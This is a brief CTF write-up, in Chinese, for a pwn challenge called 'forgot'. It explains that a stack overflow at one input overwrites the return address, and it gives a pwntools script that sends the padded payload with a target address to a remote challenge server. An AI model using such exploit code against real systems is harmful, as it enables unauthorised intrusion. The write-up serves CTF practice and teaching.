# forgot

这题的程序看起来非常复杂，其实可以省去很多的操作，只需要在输入v2的时候栈溢出覆盖返回地址即可

```python
from pwn import *

context.log_level = 'debug'
#n = process('./forgot')
n = remote('111.198.29.45',35834)
elf = ELF('./forgot')

offset = 0x20
n.recvuntil('> ')
n.sendline('A')
n.recvuntil('> ')
n.sendline('A' * 32 + p32(0x080486CC))
print(n.recvall())

```

